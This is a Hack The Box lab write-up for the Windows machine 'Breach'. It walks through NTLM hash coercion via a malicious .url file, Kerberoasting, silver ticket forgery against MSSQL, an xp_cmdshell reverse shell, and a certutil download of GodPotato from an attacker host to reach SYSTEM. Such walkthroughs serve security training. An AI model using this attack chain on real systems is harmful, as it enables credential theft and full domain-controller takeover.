Author: Faridd

### HTB Write-Up: Breach

| Field      | Details                                                          |
|------------|------------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Breach)      |
| Difficulty | Medium                                                            |
| OS         | Windows                                                           |
| Date       | November 10, 2026                                                 |

---

#### Table of Contents
1. [Reconnaissance — Nmap](#1-reconnaissance--nmap)
2. [Enumeration — Writable SMB Share Discovery](#2-enumeration--writable-smb-share-discovery)
3. [Initial Access — NTLM Hash Coercion via Malicious .url File](#3-initial-access--ntlm-hash-coercion-via-malicious-url-file)
4. [Credential Discovery — Kerberoasting svc_mssql](#4-credential-discovery--kerberoasting-svc_mssql)
5. [Privilege Escalation (Part 1) — Silver Ticket Forgery for MSSQL sysadmin](#5-privilege-escalation-part-1--silver-ticket-forgery-for-mssql-sysadmin)
6. [Privilege Escalation (Part 2) — xp_cmdshell RCE & GodPotato to SYSTEM](#6-privilege-escalation-part-2--xp_cmdshell-rce--godpotato-to-system)

---

#### 1. Reconnaissance — Nmap

```bash
nmap -A 10.129.100.42 -p 1-10000
```

**Result (relevant extract):**

```
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc?
139/tcp  open  netbios-ssn?
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
9389/tcp open  mc-nmf        .NET Message Framing
```

The target is a Domain Controller for **`breach.vl`**, hostname **BREACHDC**, with a notable additional **MSSQL** service (port 1433) alongside the standard AD services.

---

#### 2. Enumeration — Writable SMB Share Discovery

```bash
netexec smb 10.129.100.42 -u "guest" -p "" --shares
```

**Result:**

```
[+] breach.vl\guest: 
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
NETLOGON                        Logon server share 
share           READ,WRITE      
SYSVOL                          Logon server share 
Users           READ            
```

The **`share`** folder stood out — guest access granted both **read and write**, a significant misconfiguration.

##### 2.1 — Exploring the Share

```bash
smbclient //10.129.100.42/share -U "guest%"
smb: \> recurse on
smb: \> ls
```

**Result:**

```
finance
software
transfer

\transfer
  claire.pope
  diana.pope
  julia.wong
```

```
NT_STATUS_ACCESS_DENIED listing \transfer\claire.pope\*
NT_STATUS_ACCESS_DENIED listing \transfer\diana.pope\*
NT_STATUS_ACCESS_DENIED listing \transfer\julia.wong\*
```

Each user's own subfolder was locked down individually, but the **write access at the top-level share** still gave a way in: any user who opens this top-level folder in Explorer could be made to leak credentials to an attacker-controlled file.

---

#### 3. Initial Access — NTLM Hash Coercion via Malicious .url File

##### 3.1 — Crafting the Malicious Shortcut

An Internet Shortcut (`.url`) file was created pointing to an attacker-controlled UNC path. When a user simply *browses to the folder* containing such a file in Windows Explorer, Explorer attempts to resolve its icon, triggering an outbound SMB authentication attempt — without the user ever double-clicking it:

```ini
[InternetShortcut]
URL=file://10.10.14.25/share/test.url
IconFile=\\10.10.14.25\share\icon.ico
IconIndex=1
```

##### 3.2 — Capturing the Authentication Attempt

```bash
sudo responder -w -v -I tun0
```

```bash
smb: \transfer\> put test.url
```

**Result:**

```
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong
[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:fc3c82b7df1182a3:91C2F67FC734E0263AA3419BACFAF407:...
```

`Julia.Wong`'s NTLMv2 hash was captured when she (or an automated process acting as her) browsed the shared folder.

##### 3.3 — Cracking the Hash

```bash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

**Result:**

```
...:Computer1
```

`Julia.Wong`'s password was cracked: **`Computer1`**.

##### 3.4 — User Flag

```bash
smbclient //10.129.100.42/share -U "Julia.Wong%Computer1"
smb: \> get \transfer\julia.wong\user.txt
```

```bash
cat \transfer\julia.wong\user.txt
55d33e52bc5fa7a687b9f0dcfa103dda
```

---

#### 4. Credential Discovery — Kerberoasting svc_mssql

BloodHound enumeration identified **`svc_mssql`** as a **Kerberoastable** account (it has a registered Service Principal Name, making it a valid Kerberoasting target).

##### 4.1 — Requesting the Service Ticket

```bash
impacket-GetUserSPNs breach.vl/Julia.Wong:'Computer1' -dc-ip 10.129.100.42 -request
```

**Result:**

```
ServicePrincipalName              Name       PasswordLastSet
--------------------------------  ---------  --------------------------
MSSQLSvc/breachdc.breach.vl:1433  svc_mssql  2022-02-17 14:43:08.106169

$krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl/svc_mssql*$...
```

A TGS ticket for the `svc_mssql` service account was obtained, encrypted with that account's own password-derived key — the basis of Kerberoasting.

##### 4.2 — Cracking the Ticket Offline

```bash
john hash1 --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs
```

**Result:**

```
Trustno1         (?)
```

`svc_mssql`'s password was cracked: **`Trustno1`**.

##### 4.3 — Confirming Limited Access

The cracked credentials were tested, but turned out to be a dead end for direct access:

- WinRM access failed for `svc_mssql`.
- MSSQL login via `impacket-mssqlclient` succeeded, but the account had very low database privileges — no way to enable `xp_cmdshell`, no linked servers to pivot through, and nothing sensitive in the accessible databases.

---

#### 5. Privilege Escalation (Part 1) — Silver Ticket Forgery for MSSQL sysadmin

With `svc_mssql` too low-privileged to be useful directly, the next move was a **Silver Ticket attack** against the MSSQL service.

**Why a silver ticket fits here:** Kerberos has a structural trust point that can be turned against it. When a client presents a service ticket (TGS) to a service like MSSQL, that service does **not** call back to the Domain Controller to verify it — it simply decrypts the ticket locally using its own secret (the service account's NTLM hash) and trusts whatever's inside if decryption succeeds. This is a deliberate performance optimization in the Kerberos design, but it means **the service itself is the sole judge of a ticket's validity**.

Since `svc_mssql`'s NTLM hash was now known, that hash *is* effectively the "signing key" for any ticket targeting the MSSQL service. A ticket can be forged from scratch — not reused, but newly constructed — claiming to be any identity, with any group memberships baked into its PAC (Privilege Attribute Certificate). The service has no way to tell a forged ticket from a real one, because it never asks the DC to confirm it. By forging a ticket for `Administrator` with the Domain Admins SID stuffed into the PAC, MSSQL will treat the holder as a sysadmin-equivalent user — regardless of what the real `svc_mssql` account could actually do.

##### 5.1 — Deriving the NT Hash

```bash
pypykatz crypto nt Trustno1
69596c7aa1e8daee17f8e78870e25a5c
```

##### 5.2 — Forging the Silver Ticket

```bash
impacket-ticketer -spn MSSQLSvc/breachdc.breach.vl -domain-sid S-1-5-21-2330692793-3312915120-706255856 -nthash 69596c7aa1e8daee17f8e78870e25a5c -dc-ip 10.129.100.42 -domain breach.vl -user-id 500 Administrator
```

**Result:**

```
[*] Customizing ticket for breach.vl/Administrator
[*] Saving ticket in Administrator.ccache
```

A forged service ticket was created, claiming to be `Administrator` (RID 500) for the MSSQL service specifically.

##### 5.3 — Using the Forged Ticket

```bash
export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient breach.vl/Administrator@breachdc.breach.vl -k -no-pass
```

The forged ticket was accepted by MSSQL, granting a sysadmin-equivalent session as `Administrator` — despite no real Administrator credentials ever being used.

---

#### 6. Privilege Escalation (Part 2) — xp_cmdshell RCE & GodPotato to SYSTEM

##### 6.1 — Enabling xp_cmdshell

```sql
EXEC xp_cmdshell 'whoami';
-- blocked: component is turned off

EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

**Result:**

```
output
----------------
breach\svc_mssql
```

With the forged sysadmin session, `xp_cmdshell` could now be enabled, giving OS-level command execution — though still running as the underlying `svc_mssql` service account at the OS level.

##### 6.2 — Reverse Shell via xp_cmdshell

```sql
EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4A<SNIP>';
```

```bash
rlwrap nc -nvlp 4444
```

**Result:**

```
connect to [10.10.14.25] from (UNKNOWN) [10.129.100.42] 59571
PS C:\Windows\system32> whoami
breach\svc_mssql
```

##### 6.3 — Privilege Check

```powershell
whoami /priv
```

**Result (relevant extract):**

```
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

`svc_mssql` holds **SeImpersonatePrivilege** — a well-known path to SYSTEM via a "Potato"-family token impersonation exploit.

##### 6.4 — Fetching GodPotato

```powershell
mkdir C:\temp
cd C:\temp
```

```bash
python3 -m http.server 80
```

```powershell
certutil -f -urlcache "http://10.10.14.25/GodPotato-NET4.exe" "C:\temp\GodPotato-NET4.exe"
```

**GodPotato** abuses the same class of COM/DCOM NTLM-relay-to-SYSTEM trick as PrintSpoofer/JuicyPotato, exploiting `SeImpersonatePrivilege` to coerce a SYSTEM token via a crafted DCOM object and impersonate it.

##### 6.5 — Root Flag via GodPotato

```powershell
.\GodPotato-NET4.exe -cmd "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt"
```

**Result:**

```
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] Find System Token : True
[*] CurrentUser: NT AUTHORITY\SYSTEM
fc98f418f94f8cdb9a30ef026fe64345
```
